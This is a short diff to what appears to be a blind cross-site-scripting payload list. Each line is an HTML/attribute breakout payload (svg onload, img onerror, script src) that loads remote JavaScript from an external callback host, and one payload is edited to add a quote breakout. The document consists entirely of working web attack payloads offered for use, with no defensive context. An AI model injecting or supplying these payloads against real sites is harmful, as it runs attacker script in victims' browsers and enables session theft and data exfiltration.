@@ -1,5 +1,5 @@
 '"><svg/onload=import('//xss.report/c/hnterx?q')>
-<img/src/onerror=import('//xss.report/c/hnterx');//>
+'"><img/src/onerror=import('//xss.report/c/hnterx?gp');//>
 '"><script src=https://xss.report/c/hnterx?1></script>
 `’"><script src=//xss.report/c/hnterx></script>
 `'"></script></title></textarea><script src=//xss.report/c/hnterx></script>
